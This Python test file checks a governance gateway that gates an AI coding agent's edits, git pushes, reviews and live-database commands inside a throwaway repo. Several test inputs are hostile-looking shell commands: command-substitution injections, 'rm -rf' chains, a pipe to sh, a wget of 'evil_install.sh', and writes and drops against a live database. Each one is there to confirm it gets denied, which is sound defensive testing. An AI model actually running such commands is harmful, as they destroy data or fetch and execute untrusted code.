#!/usr/bin/env python3
"""Acceptance tests for SPEC-GOV-ENF-001 (run: python3 enforcement/tests/test_gov.py).

Builds a throwaway governed repo + GOV_HOME in a temp dir and feeds hook JSON to govcore.
No network, no real Claude calls (reviews are simulated by a fake `claude` on PATH).
"""
import json
import os
import subprocess
import sys
import tempfile
import time

ENGINE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "govcore.py")
T = tempfile.mkdtemp(prefix="govtest_")
GOV_HOME = os.path.join(T, "gov_home")
REPO = os.path.realpath(os.path.join(T, "proj"))
ORIGIN = os.path.join(T, "origin.git")
UNONB = os.path.realpath(os.path.join(T, "unonboarded"))
BACKUPS = os.path.join(T, "backups")
FAKEBIN = os.path.join(T, "bin")
ENV = dict(os.environ, GOV_HOME=GOV_HOME, PATH=FAKEBIN + os.pathsep + os.environ["PATH"],
           GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@t", GIT_COMMITTER_NAME="t", GIT_COMMITTER_EMAIL="t@t")
ENV.pop("GOV_REVIEWER", None)
RESULTS = []


def sh(cmd, cwd=None, inp=None, env=None):
    return subprocess.run(cmd, shell=True, cwd=cwd, input=inp, capture_output=True, text=True, env=env or ENV)


def gov(args, cwd=REPO, inp=None, env=None):
    return sh("python3 %s %s" % (ENGINE, args), cwd=cwd, inp=inp, env=env)


def hook(event, payload, env=None):
    p = gov("hook " + event, inp=json.dumps(payload), env=env)
    out = p.stdout.strip()
    return json.loads(out) if out else {}


def decision(payload, env=None):
    r = hook("pre-tool", dict({"session_id": SID, "cwd": REPO}, **payload), env=env)
    return r.get("hookSpecificOutput", {}).get("permissionDecision", "allow"), \
        r.get("hookSpecificOutput", {}).get("permissionDecisionReason", "")


def check(name, cond, detail=""):
    RESULTS.append((cond, name, detail))


def edit(path):
    return {"tool_name": "Edit", "tool_input": {"file_path": path, "old_string": "a", "new_string": "b"}}


def bash(cmd, cwd=REPO):
    return {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": cwd}


SID = "sess-1"

# ── fixture ────────────────────────────────────────────────────────────────
os.makedirs(FAKEBIN)
os.makedirs(BACKUPS)
with open(os.path.join(FAKEBIN, "claude"), "w") as fh:
    fh.write("#!/usr/bin/env bash\ncat >/dev/null\necho \"Findings: none (reviewer $GOV_REVIEWER)\"\n"
             "echo \"VERDICT: ${FAKE_VERDICT:-APPROVED}\"\n")
os.chmod(os.path.join(FAKEBIN, "claude"), 0o755)
with open(os.path.join(FAKEBIN, "gh"), "w") as fh:  # offline: every gh call fails
    fh.write("#!/usr/bin/env bash\nexit 1\n")
os.chmod(os.path.join(FAKEBIN, "gh"), 0o755)
sh("git init -q --bare %s" % ORIGIN)
os.makedirs(os.path.join(REPO, "custom_addons", "mod"))
os.makedirs(os.path.join(REPO, "docs"))
files = {
    "CLAUDE.md": "pod rules\n", "PROJECT_STATE.md": "state\n", "CHANGELOG.md": "log\n",
    "docs/DECISION_LOG.md": "## DEC-TEST-001 approved thing\n", "custom_addons/mod/a.py": "a\n",
}
for f, c in files.items():
    open(os.path.join(REPO, f), "w").write(c)
json.dump({"pod": "POD-TEST", "briefing_docs": ["CLAUDE.md", "PROJECT_STATE.md"],
           "code_paths": ["custom_addons/"], "required_doc_updates": ["CHANGELOG.md", "PROJECT_STATE.md"],
           "spec_sources": ["docs"], "live_databases": ["LIVEDB"], "backup_dirs": [BACKUPS],
           "backup_max_age_hours": 1}, open(os.path.join(REPO, ".governance.json"), "w"))
sh("git init -q -b main && git add -A && git commit -qm init && git remote add origin %s && git push -q origin main"
   % ORIGIN, cwd=REPO)
os.makedirs(UNONB)
sh("git init -q && git remote add origin https://github.com/acme-owner/x.git", cwd=UNONB)
os.makedirs(GOV_HOME)
json.dump({"owner_patterns": ["acme-owner"], "repos": [REPO]}, open(os.path.join(GOV_HOME, "config.json"), "w"))

# ── R1 onboarding ──────────────────────────────────────────────────────────
d, r = decision(edit(os.path.join(UNONB, "x.py")))
check("R1 un-onboarded owner repo: edit denied", d == "deny" and "not onboarded" in r, r[:90])
d, _ = decision(edit(os.path.join(T, "scratch.txt")))
check("R1 non-project path: edit allowed", d == "allow")

# ── R2 briefing ────────────────────────────────────────────────────────────
d, r = decision(edit(os.path.join(REPO, "docs", "x.md")))
check("R2 edit before briefing denied", d == "deny" and "briefing" in r, r[:90])
decision({"tool_name": "Read", "tool_input": {"file_path": os.path.join(REPO, "CLAUDE.md")}})
d, r = decision(edit(os.path.join(REPO, "docs", "x.md")))
check("R2 still denied with one of two docs read", d == "deny" and "PROJECT_STATE.md" in r)
decision(bash("cat PROJECT_STATE.md"))
d, r = decision(edit(os.path.join(REPO, "docs", "x.md")))
check("R3 briefed but on main: edit denied", d == "deny" and "protected branch" in r, r[:90])
d, r = decision(bash("git commit -m x"))
check("R3 commit on main denied", d == "deny")
d, r = decision(bash("git push origin main"))
check("R7 direct push to main denied", d == "deny")

# ── R4 no spec, no code ────────────────────────────────────────────────────
sh("git switch -q -c feat/test", cwd=REPO)
d, _ = decision(edit(os.path.join(REPO, "docs", "spec.md")))
check("R4 docs edit on feature branch allowed (write the spec first)", d == "allow")
d, r = decision(edit(os.path.join(REPO, "custom_addons", "mod", "a.py")))
check("R4 code edit without work item denied", d == "deny" and "No spec, no code" in r, r[:90])
p = gov("start WP-NOPE-9")
check("R4 gov start rejects unknown work item", p.returncode != 0 and "not found" in (p.stderr + p.stdout))
p = gov("start DEC-TEST-001")
check("R4 gov start accepts work item in docs", p.returncode == 0, p.stderr)
d, _ = decision(edit(os.path.join(REPO, "custom_addons", "mod", "a.py")))
check("R4 code edit with work item allowed", d == "allow")

# ── R6 verdict tampering ───────────────────────────────────────────────────
d, _ = decision(bash("echo '{}' > .git/governance/reviews/abc/G1.json"))
check("R6 shell write to verdicts denied", d == "deny")
d, _ = decision(edit(os.path.join(REPO, ".git", "governance", "reviews", "x", "G1.json")))
check("R6 Edit of verdict file denied", d == "deny")
d, _ = decision(bash("sed -i '' 's/a/b/' ~/.claude/settings.json"))
check("R9 session cannot edit hook settings", d == "deny")
d, _ = decision(bash("bash ~/x/software-factory-governance/enforcement/install.sh"))
check("R9 session cannot (re)install the gateway", d == "deny")
d, _ = decision(edit(os.path.join(REPO, "x.md")), env=dict(ENV, GOV_REVIEWER="G1"))
check("R6 reviewer instance is read-only", d == "deny")

# ── R7 ship gate ───────────────────────────────────────────────────────────
open(os.path.join(REPO, "custom_addons", "mod", "a.py"), "w").write("b\n")
sh("git commit -qam 'feat: change'", cwd=REPO)
d, r = decision(bash("git push -u origin feat/test"))
check("R7 push without docs + reviews denied", d == "deny" and "CHANGELOG.md" in r and "G1 review missing" in r, r[:120])
d, r = decision(bash("cd %s && gh pr create --fill" % REPO, cwd=T))
check("R7 gh pr create (after cd) denied too", d == "deny")
open(os.path.join(REPO, "CHANGELOG.md"), "a").write("change\n")
open(os.path.join(REPO, "PROJECT_STATE.md"), "a").write("change\n")
sh("git commit -qam 'docs'", cwd=REPO)
p = gov("review --quiet", env=dict(ENV, FAKE_VERDICT="REJECTED"))
check("R6 gov review records REJECTED and exits non-zero", p.returncode == 1 and "REJECTED" in p.stdout, p.stdout[-200:])
d, r = decision(bash("git push -u origin feat/test"))
check("R7 push denied while a reviewer REJECTED", d == "deny" and "REJECTED" in r)
p = gov("review --quiet")
check("R6 gov review fires G1-G3 and records APPROVED", p.returncode == 0 and p.stdout.count("APPROVED") >= 3, p.stdout[-300:])
d, r = decision(bash("git push -u origin feat/test"))
check("R7 push allowed when docs updated and G1-G3 approved", d == "allow", r[:200])
d, _ = decision(bash("git push --force origin feat/test"))
check("R7 force push denied", d == "deny")
open(os.path.join(REPO, "custom_addons", "mod", "a.py"), "w").write("c\n")
sh("git commit -qam 'feat: more'", cwd=REPO)
d, r = decision(bash("git push"))
check("R6 new commit invalidates verdicts", d == "deny" and "review missing" in r)
d, _ = decision(bash("gh pr merge 3 --squash"))
check("R7 gh pr merge asks the user", d == "ask")

# ── R5 live database ───────────────────────────────────────────────────────
cmd = "python odoo-bin --addons-path=x -d LIVEDB -u some_mod --stop-after-init"
d, r = decision(bash(cmd, cwd=T))
check("R5 live -u without fresh backup denied (from any cwd)", d == "deny" and "LIVE" in r, r[:90])
d, _ = decision(bash("psql -d LIVEDB -c \"UPDATE res_users SET active=false\"", cwd=T))
check("R5 write SQL on live db denied", d == "deny")
d, _ = decision(bash("psql -d LIVEDB -c \"select count(*) from res_users\"", cwd=T))
check("R5 read-only SQL on live db allowed", d == "allow")
d, _ = decision(bash("psql -d LIVEDB < migration.sql", cwd=T))
check("R5 psql reading a file via < on live db denied", d == "deny")
d, _ = decision(bash("cat migration.sql | psql LIVEDB", cwd=T))
check("R5 SQL piped into psql on live db denied", d == "deny")
d, _ = decision(bash("psql -d LIVEDB -f migration.sql", cwd=T))
check("R5 psql -f on live db denied", d == "deny")
d, _ = decision(bash("psql -l", cwd=T))
check("R5 psql -l (list databases) allowed", d == "allow")
d, _ = decision(bash("python odoo-bin -d DRILLDB -u some_mod --stop-after-init", cwd=T))
check("R5 drill db update allowed", d == "allow")
open(os.path.join(BACKUPS, "live_%d.dump" % time.time()), "w").write("x")
d, r = decision(bash(cmd, cwd=T))
check("R5 live -u with fresh backup asks the user", d == "ask", r[:90])
d, _ = decision(bash("dropdb LIVEDB", cwd=T))
check("R5 dropdb live asks the user", d == "ask")

# ── R8 CI docs gate ────────────────────────────────────────────────────────
base = sh("git rev-parse origin/main", cwd=REPO).stdout.strip()
head = sh("git rev-parse HEAD", cwd=REPO).stdout.strip()
body = os.path.join(T, "body.txt")
open(body, "w").write("Implements DEC-TEST-001")
p = gov("ci-docs-gate --repo . --base %s --head %s --pr-title t --pr-body-file %s" % (base, head, body))
check("R8 CI docs gate passes with work item + docs", p.returncode == 0, p.stdout)
open(body, "w").write("no reference")
p = gov("ci-docs-gate --repo . --base %s --head %s --pr-title t --pr-body-file %s" % (base, head, body))
check("R8 CI docs gate fails without work item", p.returncode == 1)
sh("git switch -q -c feat/nodocs main && echo z > custom_addons/mod/a.py && git commit -qam x", cwd=REPO)
head2 = sh("git rev-parse HEAD", cwd=REPO).stdout.strip()
open(body, "w").write("DEC-TEST-001")
p = gov("ci-docs-gate --repo . --base %s --head %s --pr-title t --pr-body-file %s" % (base, head2, body))
check("R8 CI docs gate fails when governance docs not updated", p.returncode == 1 and "CHANGELOG" in p.stdout)
sh("git switch -q feat/test", cwd=REPO)
sh("echo '{}' > .governance.json && git commit -qam weaken", cwd=REPO)
head3 = sh("git rev-parse HEAD", cwd=REPO).stdout.strip()
p = gov("ci-docs-gate --repo . --base %s --head %s --pr-title t --pr-body-file %s" % (base, head3, body))
check("R8 weakening .governance.json needs governance-change label", p.returncode == 1 and "governance-change" in p.stdout)
p = gov("ci-docs-gate --repo . --base %s --head %s --pr-title t --pr-body-file %s --labels governance-change"
        % (base, head3, body))
check("R8 governance-change label lets a plumbing change through", "governance-change" not in p.stdout, p.stdout[-200:])
sh("git reset -q --hard HEAD~1", cwd=REPO)
sh("mkdir -p enforcement && echo x > enforcement/govcore.py && git add -A && git commit -qm engine", cwd=REPO)
head4 = sh("git rev-parse HEAD", cwd=REPO).stdout.strip()
p = gov("ci-docs-gate --repo . --base %s --head %s --pr-title t --pr-body-file %s" % (base, head4, body))
check("R8 changing the gate engine (enforcement/) needs governance-change label",
      p.returncode == 1 and "enforcement/govcore.py" in p.stdout)
sh("git reset -q --hard HEAD~1", cwd=REPO)

# ── L3 git hooks (humans) ──────────────────────────────────────────────────
sh("git switch -q main", cwd=REPO)
p = gov("githook pre-commit")
check("L3 human pre-commit on main blocked", p.returncode == 1)
p = gov("githook pre-push", inp="refs/heads/main abc refs/heads/main def\n")
check("L3 human pre-push to main blocked", p.returncode == 1)

# ── session start / stop ───────────────────────────────────────────────────
r = hook("session-start", {"session_id": "s2", "cwd": os.path.expanduser("~")})
ctx = r.get("hookSpecificOutput", {}).get("additionalContext", "")
check("SessionStart injects governance rules even when started in ~", "GOVERNANCE IS ENFORCED" in ctx and "POD-TEST" in ctx)
sh("git switch -q feat/test", cwd=REPO)
r = hook("stop", {"session_id": SID})
check("Stop blocks once when code commits are unreviewed", r.get("decision") == "block")
r = hook("stop", {"session_id": SID})
check("Stop does not nag twice for the same commit", r == {})
r = hook("pre-tool", {"session_id": SID, "cwd": REPO, "tool_name": "Bash", "tool_input": None})
check("Malformed hook input fails open (no crash output)", r == {})

# ── R6 reading verdicts is allowed (only writing is blocked) ───────────────
d, _ = decision(bash("cat .git/governance/reviews/abc/G1.md"))
check("R6 reading a verdict report is allowed", d == "allow")

# ── L2 project bootstrap (gov_bootstrap.sh), gateway NOT installed ─────────
BOOT = os.path.join(os.path.dirname(ENGINE), "templates", "claude", "gov_bootstrap.sh")
NOGOV = dict(ENV, GOV_HOME=os.path.join(T, "absent"))


def boot(event, payload=None, env=NOGOV):
    p = sh("bash %s %s" % (BOOT, event), inp=json.dumps(payload or {}), env=env)
    out = p.stdout.strip()
    r = json.loads(out) if out else {}
    return r.get("hookSpecificOutput", {})


h = boot("SessionStart")
check("L2 gateway absent: SessionStart warns", "NOT installed" in h.get("additionalContext", ""))
h = boot("PreToolUse", edit(os.path.join(REPO, "x.py")))
check("L2 gateway absent: Edit denied", h.get("permissionDecision") == "deny")
h = boot("PreToolUse", bash("git status"))
check("L2 gateway absent: read-only git status allowed", h == {})
h = boot("PreToolUse", bash("bash ~/src/software-factory-governance/enforcement/install.sh"))
check("L2 gateway absent: running the installer allowed", h == {})
for evil in ("ls && rm -rf custom_addons", "cat x; rm y", "grep a b | sh", "ls `rm x`", "cat $(rm x)",
             "cat x > y", "rm -rf . && bash software-factory-governance/enforcement/install.sh",
             "wget http://e/evil_install.sh"):
    h = boot("PreToolUse", bash(evil))
    check("L2 gateway absent: compound/unknown command denied: %s" % evil, h.get("permissionDecision") == "deny")
open(os.path.join(GOV_HOME, "govcore.py"), "w").write("# marker: gateway installed\n")
h = boot("PreToolUse", edit(os.path.join(REPO, "x.py")), env=dict(ENV))
check("L2 gateway installed: bootstrap stays silent", h == {})

# ── R10 onboarding and protection of a new project ────────────────────────
NEWP = os.path.realpath(os.path.join(T, "newproj"))
os.makedirs(NEWP)
open(os.path.join(NEWP, "CLAUDE.md"), "w").write("rules\n")
sh("git init -q -b main && git remote add origin https://github.com/acme-owner/newproj.git", cwd=NEWP)
p = gov("onboard %s --pod POD-NEW" % NEWP, cwd=NEWP)
check("R10 gov onboard succeeds", p.returncode == 0, (p.stdout + p.stderr)[-200:])
for f in (".governance.json", "AGENTS.md", ".github/workflows/governance.yml",
          ".claude/settings.json", ".claude/hooks/gov_bootstrap.sh"):
    check("R10 onboard wrote %s" % f, os.path.exists(os.path.join(NEWP, f)))
mk = json.load(open(os.path.join(NEWP, ".governance.json")))
check("R10 marker carries the pod and existing briefing docs",
      mk.get("pod") == "POD-NEW" and mk.get("briefing_docs") == ["CLAUDE.md"], str(mk)[:120])
wf = "".join(l for l in open(os.path.join(NEWP, ".github/workflows/governance.yml"))
             if not l.lstrip().startswith("#"))
check("R10 caller workflow pins gate-v1 and does not inherit secrets",
      "@gate-v1" in wf and "secrets: inherit" not in wf)
st = json.load(open(os.path.join(NEWP, ".claude/settings.json")))
check("R10 bootstrap hooks registered for PreToolUse and SessionStart",
      all("gov_bootstrap.sh" in json.dumps(st["hooks"].get(e)) for e in ("PreToolUse", "SessionStart")))
check("R10 onboarded repo registered in config",
      NEWP in json.load(open(os.path.join(GOV_HOME, "config.json")))["repos"])
p = gov("onboard %s" % NEWP, cwd=NEWP)
check("R10 re-running onboard is idempotent",
      p.returncode == 0 and json.load(open(os.path.join(NEWP, ".claude/settings.json"))) == st)
p = gov("protect --repo %s --dry-run --gate-tags" % NEWP, cwd=NEWP)
check("R10 protect dry-run: main ruleset requires governance / gate, no bypass actors",
      p.returncode == 0 and "software-factory-main" in p.stdout and '"governance / gate"' in p.stdout
      and '"bypass_actors": []' in p.stdout and "acme-owner/newproj" in p.stdout, (p.stdout + p.stderr)[-200:])
check("R10 protect dry-run --gate-tags: gate-v* tag ruleset", "refs/tags/gate-v*" in p.stdout)
check("R10 protect: linear history is opt-in (off by default)", "required_linear_history" not in p.stdout)
p = gov("protect --repo %s --dry-run --linear-history" % NEWP, cwd=NEWP)
check("R10 protect --linear-history adds the rule", '"required_linear_history"' in p.stdout, p.stdout[-200:])

# ── report ─────────────────────────────────────────────────────────────────
fails = 0
for ok, name, detail in RESULTS:
    fails += not ok
    print("%s  %s%s" % ("PASS" if ok else "FAIL", name, ("  [%s]" % detail) if (detail and not ok) else ""))
print("\n%d/%d passed  (temp dir %s)" % (len(RESULTS) - fails, len(RESULTS), T))
sys.exit(1 if fails else 0)
